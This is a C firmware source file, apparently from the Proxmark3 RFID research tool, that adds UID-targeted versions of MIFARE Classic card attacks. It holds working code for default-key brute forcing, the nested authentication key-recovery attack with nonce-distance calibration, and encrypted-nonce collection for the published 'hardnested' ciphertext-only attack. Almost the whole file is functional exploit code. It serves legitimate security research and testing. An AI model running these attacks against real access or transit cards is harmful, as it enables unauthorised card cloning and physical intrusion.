//-----------------------------------------------------------------------------
// Loek Sangers and Romke van Dijk, Jan 2016
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// Collection of functions both already written by others (See the original functions in the other firmware files, with the same name without Bump prepended!), and functions written entirely by us. The functions were changed to allow for UID selection to heppen within the function to support multiple cards within the reader range!
//-----------------------------------------------------------------------------



#include "proxmark3.h"
#include "apps.h"
#include "util.h"
#include "string.h"
#include "cmd.h"
#include "iso14443crc.h"
#include "iso14443a.h"
#include "bump.h"
#include "crapto1.h"
#include "mifareutil.h"
#include "BigBuf.h"
#include "parity.h"
#include "mifarecmd.h"
#include "crc.h"

int BumpActivateUID(uint64_t uid){// only works for 4 byte uid

	uint8_t resp[MAX_FRAME_SIZE]; // theoretically. A usual RATS will be much smaller
	uint8_t resp_par[MAX_PARITY_SIZE];

	uint8_t buf[4];

	num_to_bytes(uid, 4, buf);

	uint8_t wupa[]       = { 0x52 };

	ReaderTransmitBitsPar(wupa, 7, NULL, NULL);
	if (!ReaderReceive(resp, resp_par)) {
			//cmd_send(CMD_ACK,1,0,0,NULL,0);
			return 1;
		}

	uint8_t sel_uid[]    = { 0x93,0x70,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

	memcpy(sel_uid+2, buf, 4);	// the UID
	sel_uid[6] = sel_uid[2] ^ sel_uid[3] ^ sel_uid[4] ^ sel_uid[5];  // calculate and add BCC
	AppendCrc14443a(sel_uid, 7);	// calculate and add CRC
	ReaderTransmit(sel_uid, sizeof(sel_uid), NULL);
	if (!ReaderReceive(resp, resp_par)) {
		//cmd_send(CMD_ACK,2,0,0,NULL,0);
		return 2;
	}

	//cmd_send(CMD_ACK,0,0,0,NULL,0);
	return 0;
}

void BumpDefaultKeys(uint16_t arg0, uint64_t arg1, uint8_t arg2, uint8_t *datain)
{
  // params
	uint8_t blockNo = arg0 & 0xff;
	uint8_t keyType = (arg0 >> 8) & 0xff;
	uint8_t keyCount = arg2;
	uint64_t ui64Key = 0;

	// variables
	int i;
	byte_t isOK = 0;
//    uint8_t uid[10];
	uint32_t cuid = 0;
	struct Crypto1State mpcs = {0, 0};
	struct Crypto1State *pcs;
	pcs = &mpcs;

	LED_A_ON();
	LED_B_OFF();
	LED_C_OFF();


	int OLD_MF_DBGLEVEL = MF_DBGLEVEL;
	MF_DBGLEVEL = MF_DBG_NONE;

	for (i = 0; i < keyCount; i++) {
		if(mifare_classic_halt(pcs, cuid)) {
			if (MF_DBGLEVEL >= 1)	Dbprintf("ChkKeys: Halt error");
		}

		if(BumpActivateUID(arg1) != 0) {
			if (MF_DBGLEVEL >= 1)	Dbprintf("ChkKeys: Can't select card");
			break;
		};

		ui64Key = bytes_to_num(datain + i * 6, 6);
		if(mifare_classic_auth(pcs, arg1, blockNo, keyType, ui64Key, AUTH_FIRST)) {
			continue;
		};

		isOK = 1;
		break;
	}

	if(mifare_classic_halt(pcs, cuid)) {
		if (MF_DBGLEVEL >= 1)	Dbprintf("ChkKeys: Halt error");
	}
	//  ----------------------------- crypto1 destroy
	crypto1_destroy(pcs);

	LED_B_ON();
    cmd_send(CMD_ACK,isOK,0,0,datain + i * 6,6);
	LED_B_OFF();

	// restore debug level
	MF_DBGLEVEL = OLD_MF_DBGLEVEL;

}

void BumpReadBlock(uint8_t arg0, uint8_t arg1, uint64_t arg2, uint8_t *datain)
{
	// params
		uint8_t blockNo = arg0;
		uint8_t keyType = arg1;
		uint64_t ui64Key = 0;
		ui64Key = bytes_to_num(datain, 6);

		// variables
		byte_t isOK = 0;
		byte_t dataoutbuf[16];
		struct Crypto1State mpcs = {0, 0};
		struct Crypto1State *pcs;
		pcs = &mpcs;

		LED_A_ON();
		LED_B_OFF();
		LED_C_OFF();

		while (true) {
			if(BumpActivateUID(arg2) != 0) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Can't select card");
				break;
			};

			if(mifare_classic_auth(pcs, arg2, blockNo, keyType, ui64Key, AUTH_FIRST)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Auth error");
				break;
			};

			if(mifare_classic_readblock(pcs, arg2, blockNo, dataoutbuf)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Read block error");
				break;
			};

			if(mifare_classic_halt(pcs, arg2)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Halt error");
				break;
			};

			isOK = 1;
			break;
		}

		//  ----------------------------- crypto1 destroy
		crypto1_destroy(pcs);

		if (MF_DBGLEVEL >= 2)	DbpString("READ BLOCK FINISHED");

		LED_B_ON();
		cmd_send(CMD_ACK,isOK,0,0,dataoutbuf,16);
		LED_B_OFF();

		LEDsoff();

}
void BumpNested(uint32_t arg0, uint32_t arg1, uint32_t calibrate, uint8_t *datain)
{
	// params
	uint8_t blockNo = arg0 & 0xff;
	uint8_t keyType = (arg0 >> 8) & 0xff;
	uint8_t targetBlockNo = arg1 & 0xff;
	uint8_t targetKeyType = (arg1 >> 8) & 0xff;
	uint64_t ui64Key = 0, carduid = 0;

	ui64Key = bytes_to_num(datain, 6);

	carduid = bytes_to_num(datain + 6, 4);

	Dbprintf("carduid: %08llx", carduid);


	// variables
	uint16_t rtr, i, j, len;
	uint16_t davg;
	static uint16_t dmin, dmax;
	uint32_t nt1, nt2, nttmp, nttest, ks1;
	uint8_t par[1];
	uint32_t target_nt[2], target_ks[2];

	uint8_t par_array[4];
	uint16_t ncount = 0;
	struct Crypto1State mpcs = {0, 0};
	struct Crypto1State *pcs;
	pcs = &mpcs;
	uint8_t receivedAnswer[MAX_MIFARE_FRAME_SIZE];

	uint32_t auth1_time, auth2_time;
	static uint16_t delta_time;

	LED_A_ON();
	LED_C_OFF();
	iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);

	// free eventually allocated BigBuf memory
	BigBuf_free();

	set_tracing(true);

	// statistics on nonce distance
	int16_t isOK = 0;
	#define NESTED_MAX_TRIES 12
	uint16_t unsuccessfull_tries = 0;
	if (calibrate) {	// for first call only. Otherwise reuse previous calibration
		LED_B_ON();
		WDT_HIT();

		davg = dmax = 0;
		dmin = 2000;
		delta_time = 0;

		for (rtr = 0; rtr < 17; rtr++) {

			// Test if the action was cancelled
			if(BUTTON_PRESS()) {
				isOK = -2;
				break;
			}

			// prepare next select. No need to power down the card.
			if(mifare_classic_halt(pcs, carduid)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Halt error");
				rtr--;
				continue;
			}

			if(BumpActivateUID(carduid) != 0) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Can't select card");
				rtr--;
				continue;
			}

			auth1_time = 0;
			if(mifare_classic_authex(pcs, carduid, blockNo, keyType, ui64Key, AUTH_FIRST, &nt1, &auth1_time)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Auth1 error");
				rtr--;
				continue;
			};

			if (delta_time) {
				auth2_time = auth1_time + delta_time;
			} else {
				auth2_time = 0;
			}
			if(mifare_classic_authex(pcs, carduid, blockNo, keyType, ui64Key, AUTH_NESTED, &nt2, &auth2_time)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Auth2 error");
				rtr--;
				continue;
			};

			nttmp = prng_successor(nt1, 100);				//NXP Mifare is typical around 840,but for some unlicensed/compatible mifare card this can be 160
			for (i = 101; i < 1200; i++) {
				nttmp = prng_successor(nttmp, 1);
				if (nttmp == nt2) break;
			}

			if (i != 1200) {
				if (rtr != 0) {
					davg += i;
					dmin = MIN(dmin, i);
					dmax = MAX(dmax, i);
				}
				else {
					delta_time = auth2_time - auth1_time + 32;  // allow some slack for proper timing
				}
				if (MF_DBGLEVEL >= 3) Dbprintf("Nested: calibrating... ntdist=%d", i);
			} else {
				unsuccessfull_tries++;
				if (unsuccessfull_tries > NESTED_MAX_TRIES) {	// card isn't vulnerable to nested attack (random numbers are not predictable)
					isOK = -3;
				}
			}
		}

		davg = (davg + (rtr - 1)/2) / (rtr - 1);

		if (MF_DBGLEVEL >= 3) Dbprintf("rtr=%d isOK=%d min=%d max=%d avg=%d, delta_time=%d", rtr, isOK, dmin, dmax, davg, delta_time);

		dmin = davg - 2;
		dmax = davg + 2;

		LED_B_OFF();

	}
	//  -------------------------------------------------------------------------------------------------

	LED_C_ON();

	//  get crypted nonces for target sector
	for(i=0; i < 2 && !isOK; i++) { // look for exactly two different nonces

		target_nt[i] = 0;
		while(target_nt[i] == 0) { // continue until we have an unambiguous nonce

			// prepare next select. No need to power down the card.
			if(mifare_classic_halt(pcs, carduid)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Halt error");
				continue;
			}

			if(BumpActivateUID(carduid) != 0) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Can't select card");
				continue;
			}

			auth1_time = 0;
			if(mifare_classic_authex(pcs, carduid, blockNo, keyType, ui64Key, AUTH_FIRST, &nt1, &auth1_time)) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Auth1 error");
				continue;
			};

			// nested authentication
			auth2_time = auth1_time + delta_time;
			len = mifare_sendcmd_short(pcs, AUTH_NESTED, 0x60 + (targetKeyType & 0x01), targetBlockNo, receivedAnswer, par, &auth2_time);
			if (len != 4) {
				if (MF_DBGLEVEL >= 1)	Dbprintf("Nested: Auth2 error len=%d", len);
				continue;
			};

			nt2 = bytes_to_num(receivedAnswer, 4);
			if (MF_DBGLEVEL >= 3) Dbprintf("Nonce#%d: Testing nt1=%08x nt2enc=%08x nt2par=%02x", i+1, nt1, nt2, par[0]);

			// Parity validity check
			for (j = 0; j < 4; j++) {
				par_array[j] = (oddparity8(receivedAnswer[j]) != ((par[0] >> (7-j)) & 0x01));
			}

			ncount = 0;
			nttest = prng_successor(nt1, dmin - 1);
			for (j = dmin; j < dmax + 1; j++) {
				nttest = prng_successor(nttest, 1);
				ks1 = nt2 ^ nttest;

				if (valid_nonce(nttest, nt2, ks1, par_array)){
					if (ncount > 0) { 		// we are only interested in disambiguous nonces, try again
						if (MF_DBGLEVEL >= 3) Dbprintf("Nonce#%d: dismissed (ambigous), ntdist=%d", i+1, j);
						target_nt[i] = 0;
						break;
					}
					target_nt[i] = nttest;
					target_ks[i] = ks1;
					ncount++;
					if (i == 1 && target_nt[1] == target_nt[0]) { // we need two different nonces
						target_nt[i] = 0;
						if (MF_DBGLEVEL >= 3) Dbprintf("Nonce#2: dismissed (= nonce#1), ntdist=%d", j);
						break;
					}
					if (MF_DBGLEVEL >= 3) Dbprintf("Nonce#%d: valid, ntdist=%d", i+1, j);
				}
			}
			if (target_nt[i] == 0 && j == dmax+1 && MF_DBGLEVEL >= 3) Dbprintf("Nonce#%d: dismissed (all invalid)", i+1);
		}
	}

	LED_C_OFF();

	//  ----------------------------- crypto1 destroy
	crypto1_destroy(pcs);

	byte_t buf[4 + 4 * 4];
	memcpy(buf, &carduid, 4);
	memcpy(buf+4, &target_nt[0], 4);
	memcpy(buf+8, &target_ks[0], 4);
	memcpy(buf+12, &target_nt[1], 4);
	memcpy(buf+16, &target_ks[1], 4);

	LED_B_ON();
	cmd_send(CMD_ACK, isOK, 0, targetBlockNo + (targetKeyType * 0x100), buf, sizeof(buf));
	LED_B_OFF();

	if (MF_DBGLEVEL >= 3)	DbpString("NESTED FINISHED");

	FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
	LEDsoff();

}

//-----------------------------------------------------------------------------
// acquire encrypted nonces in order to perform the attack described in
// Carlo Meijer, Roel Verdult, "Ciphertext-only Cryptanalysis on Hardened
// Mifare Classic Cards" in Proceedings of the 22nd ACM SIGSAC Conference on
// Computer and Communications Security, 2015
//-----------------------------------------------------------------------------
void BumpAcquireEncryptedNonces(uint32_t arg0, uint32_t arg1, uint32_t flags, uint8_t *datain)
{
	uint64_t ui64Key = 0, carduid = 0;
	struct Crypto1State mpcs = {0, 0};
	struct Crypto1State *pcs;
	pcs = &mpcs;
	uint8_t receivedAnswer[MAX_MIFARE_FRAME_SIZE];
	int16_t isOK = 0;
	uint8_t par_enc[1];
	uint8_t nt_par_enc = 0;
	uint8_t buf[USB_CMD_DATA_SIZE];
	uint32_t timeout;

	uint8_t blockNo = arg0 & 0xff;
	uint8_t keyType = (arg0 >> 8) & 0xff;
	uint8_t targetBlockNo = arg1 & 0xff;
	uint8_t targetKeyType = (arg1 >> 8) & 0xff;

	ui64Key = bytes_to_num(datain, 6);
	carduid = bytes_to_num(datain + 6, 4);

	Dbprintf("carduid: %08llx", carduid);


	bool initialize = flags & 0x0001;
	bool field_off = flags & 0x0004;



	#define AUTHENTICATION_TIMEOUT 848			// card times out 1ms after wrong authentication (according to NXP documentation)
	#define PRE_AUTHENTICATION_LEADTIME 400		// some (non standard) cards need a pause after select before they are ready for first authentication

	LED_A_ON();
	LED_C_OFF();

	if (initialize) {
		iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
	}

	LED_C_ON();

	uint16_t num_nonces = 0;

	for (uint16_t i = 0; i <= USB_CMD_DATA_SIZE - 9; ) {

		// Test if the action was cancelled
		if(BUTTON_PRESS()) {
			isOK = 2;
			field_off = true;
			break;
		}
		// prepare next select. No need to power down the card.
		if(mifare_classic_halt(pcs, carduid)) {
			if (MF_DBGLEVEL >= 1)	Dbprintf("AcquireNonces: Halt error");
			continue;
		}

		if(BumpActivateUID(carduid) != 0) {
			if (MF_DBGLEVEL >= 1)	Dbprintf("AcquireNonces: Can't select card %08llx", carduid);
				continue;
		}

		uint32_t nt1;
		if (mifare_classic_authex(pcs, carduid, blockNo, keyType, ui64Key, AUTH_FIRST, &nt1, NULL)) {
			if (MF_DBGLEVEL >= 1)	Dbprintf("AcquireNonces: Auth1 error");
			continue;
		}

		// nested authentication
		uint16_t len = mifare_sendcmd_short(pcs, AUTH_NESTED, 0x60 + (targetKeyType & 0x01), targetBlockNo, receivedAnswer, par_enc, NULL);
		if (len != 4) {
			if (MF_DBGLEVEL >= 1)	Dbprintf("AcquireNonces: Auth2 error len=%d", len);
			continue;
		}

		// send a dummy byte as reader response in order to trigger the cards authentication timeout
		uint8_t dummy_answer = 0;
		ReaderTransmit(&dummy_answer, 1, NULL);
		timeout = GetCountSspClk() + AUTHENTICATION_TIMEOUT;

		num_nonces++;
		if (num_nonces % 2) {
			memcpy(buf+i, receivedAnswer, 4);
			nt_par_enc = par_enc[0] & 0xf0;
		} else {
			nt_par_enc |= par_enc[0] >> 4;
			memcpy(buf+i+4, receivedAnswer, 4);
			memcpy(buf+i+8, &nt_par_enc, 1);
			i += 9;
		}

		// wait for the card to become ready again
		while(GetCountSspClk() < timeout);

	}

	LED_C_OFF();

	crypto1_destroy(pcs);

	LED_B_ON();
	cmd_send(CMD_ACK, isOK, carduid, num_nonces, buf, sizeof(buf));
	LED_B_OFF();

	if (MF_DBGLEVEL >= 3)	DbpString("AcquireEncryptedNonces finished");

	if (field_off) {
		FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
		LEDsoff();
	}
}



